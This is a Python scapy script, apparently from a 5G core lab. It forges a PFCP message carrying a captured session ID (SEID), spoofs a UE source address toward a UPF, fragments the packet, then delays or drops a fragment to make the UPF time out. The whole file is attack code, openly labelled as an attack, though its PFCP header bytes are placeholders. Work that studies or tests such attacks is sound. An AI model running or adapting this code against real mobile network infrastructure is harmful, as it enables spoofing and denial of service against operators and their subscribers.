from scapy.all import *
import random
import time

# Define the captured SEID (replace with real SEID from captured packet)
captured_seid = 0x12345678  # Example SEID (use the actual SEID from your capture)

# Create a simple PFCP header template using the captured SEID
def pfcp_header(seid):
    # Sample PFCP Header, this is a simplified version. Modify as per actual PFCP format
    pfcp_message = (
        b'\x00\x01\x02\x03'  # Version, Type, Sequence, etc. (Replace with actual PFCP header fields)
        + b'\x00\x00'         # Message length (adjust based on the actual message size)
        + seid.to_bytes(4, byteorder='big')  # SEID field (4 bytes)
        + b'\x00\x00'         # Padding or other fields
    )
    return pfcp_message

# UE's source IP and UPF's destination IP
src_ip = "192.168.56.106"  # UE IP address
dst_ip = "192.168.56.113"  # UPF IP address

# Port for PFCP communication (default is 8805)
src_port = 8805
dst_port = 8805

# Construct a PFCP packet with random data
message = pfcp_header(captured_seid) + bytes(random.getrandbits(8) for _ in range(2500))  # Random payload

# Wrap the raw message with an IP layer
ip_message = IP(src=src_ip, dst=dst_ip) / UDP(sport=src_port, dport=dst_port) / Raw(load=message)

# Perform IP fragmentation (MTU size is typically 1500, so it will fragment)
fragments = fragment(ip_message, fragsize=1000)  # Fragment the message into 1000-byte chunks

# Fragment 1 (part of the original PFCP message)
pkt1 = fragments[0]
send(pkt1)
print("Sent Fragment 1")

# Fragment 2 (delayed or dropped to simulate attack)
pkt2 = fragments[1]

# Simulate a delay or drop for the second fragment
print("Delaying Fragment 2 to simulate attack...")
time.sleep(5)  # Delay of 5 seconds
send(pkt2)
print("Sent Fragment 2")

# Optional: Drop the second fragment to cause a timeout at UPF
# print("Dropping Fragment 2 to simulate attack...")
# No need to send pkt2 in this case

